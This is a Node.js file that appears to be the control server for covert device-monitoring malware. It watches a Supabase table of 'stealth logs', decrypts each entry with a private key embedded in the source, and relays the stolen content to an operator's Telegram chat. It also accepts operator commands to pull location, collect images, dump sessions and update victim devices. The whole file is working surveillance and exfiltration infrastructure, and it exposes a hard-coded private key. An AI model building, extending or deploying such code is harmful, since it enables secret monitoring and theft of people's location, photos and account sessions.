const { createClient } = require('@supabase/supabase-js');
const TelegramBot = require('node-telegram-bot-api');
const { decryptHybridData } = require('./utils/decryptor');

const SUPABASE_URL = 'https://ybhticzotyvyyuxkfkwv.supabase.co';
const SUPABASE_KEY = 'YOUR_SERVICE_ROLE_KEY';
const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN';
const MY_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';

const PRIVATE_KEY_PEM = `-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDbtySWzuLoaVXJ
J8ntq0GKWQ52bMZA+8THFork+VD5rby5Zc1bQp896ZQVf2mMViETXEq+mmzdQmPs
QbPYFx/0rzP3EEQKhvHGIig4JZuiSxL1x/Dr//7usJojL+yCDMbRop23Xx3LhqkF
0yZmfuJN7qikoh43pfrcuK5itSGpU29F+bLluMBIRMp7T7jlS6RjCL4XxiZBqERj
vb0AGqE//jY4yrkJqUNeUT1xFIRMLMaNYIa0EllFY7a0vmoU4J2JI0lLS/cfmnYd
FKA3T/yeoqbbnkTLj9LxW6chsW+zscsuphSDCliwGeRZ37a3C6RyMAtfiGGYdgzw
RmghAdltAgMBAAECggEAYPGXetURCFQFzmo4bh38nqL5vyXyedS8t81J/orFAE14
smLpL6WfJo2r0ap0sz+De4vizOPNOfkjpqg8xpE5f9hYOOBb7TsqbW4/ybpKR9sR
JBISysaawM16TSFFnQIvLWsvZKvatSUW6eOHE31Ts+gkT/PaGlqpa/8uro3WKuO8
rDqdeAX0wq+SxwzsQPHOPD6xWJzt3V73OMEdWzgr/GYX3/hb5Y0EjRU5etEmZPYW
OuGb7rFgo06fu81zn7bQj55sIPwXJAxMCw2i9bt5vdeUZn4VN5/tWNZMI7RM3WET
0DBZdNVRVypTofIXNGAeSjrU613ICLeVNt9yH6P9PwKBgQDwQO+HNl3Vz/vUlTPb
RToyLHXSn15YXuTveSCZSBYlnkW8woinjbqA4Mf8Qb/P5pC+9meSBtYatuDH65jK
2Igxf0RK9B0ApfWnYhyrCfkkJBT4KaJvHWi+AErSt6JK58ApJjBYCmYQyBa+S8UY
l8flfswGm8kqNgrbY1g9zpoq7wKBgQDqHZvglCQ10TBnBbryyiseVG+bxtLXsl+k
DDi31Q9N00VEVqeq2eeGntxyScGT9C360unl+TbQguTWrM5+v3XDW2dUJltWdYFp
gW5L86KtSCC+PrrnhHQRg1/1cNCIvw3nTlcZTrPH9RUXWQRI0ZAP+JT6rwQDtYRg
chYdZ4yxYwKBgQDQQtnf0abhsxrPmk6LYqUh3Rx9aZy06f12AP/bH3vjPCGjkNY4
uEjVcwSojK4jH/CVOK9rC/YIzkJnyrh2DeFxVqrydk21xCb/47KKKWkIhSaQQDcI
Luwe184Efx515BLVGL+Lcegr3+anKrM9sESdkZ52lBB7QMGEj8dsPG2zjQKBgQDW
jrgyw9HDuKmhYTEKHZoSu9Nlcnv8zi60y7aXU54o9vy+OqSDAh0b1S+3Vj0geWJC
Q1W1PAauZaePzuOYaaNlnLk/978xp5MovEP3O5vVLwtDD35/e3ZcLoidCf0ztdTq
LXPJb8V39faUZTJ2AgkDehAfBpKpS4u8UBJQdHwOfQKBgQDO7pHEUwWTCl42mBs5
wh0L5+j0z5Hg9ufak16KuusZRdrktCaeNtTj8mJZF8zCRYfZZ56VEhMSRHbeRRIr
xjrpfX7PGBnSopkFZOaUQo2HPBr9Cm5TQ8yCUyZ5Tv7fUXZ9A2Cty7DIhyakBjus
uLcc6IBc6lCthsGREVB2PzSPmg==
-----END PRIVATE KEY-----`;

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

console.log('🚀 Server is running and watching for new logs...');

supabase
  .channel('schema-db-changes')
  .on(
    'postgres_changes',
    { event: 'INSERT', schema: 'public', table: 'stealth_logs' },
    (payload) => {
      handleNewLog(payload.new);
    }
  )
  .subscribe();

async function handleNewLog(record) {
  const { device_id, event_type, event_data } = record;
  const { encrypted_key, encrypted_data } = event_data;

  console.log(`📩 New log received from: ${device_id} [Type: ${event_type}]`);

  const decryptedContent = decryptHybridData(PRIVATE_KEY_PEM, encrypted_key, encrypted_data);

  if (decryptedContent) {
    const message = `🔴 *New Stealth Log Received*
━━━━━━━━━━━━━━━
📱 *Device ID:* \`${device_id}\`
🔍 *Event:* \`${event_type}\`
📝 *Content:*
\`\`\`
${decryptedContent}
\`\`\`
━━━━━━━━━━━━━━━`;
    bot.sendMessage(MY_CHAT_ID, message, { parse_mode: 'Markdown' });
  } else {
    console.error('❌ Failed to decrypt record from device:', device_id);
  }
}

bot.onText(/\/(get_location|collect_images|dump_sessions|update_token|update_system)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];

  const { error } = await supabase
    .from('commands')
    .insert([{ command: command, status: 'pending' }]);

  if (!error) {
    bot.sendMessage(chatId, `⏳ Command sent: *${command}*`, { parse_mode: 'Markdown' });
  } else {
    bot.sendMessage(chatId, '❌ Error sending command.');
  }
});
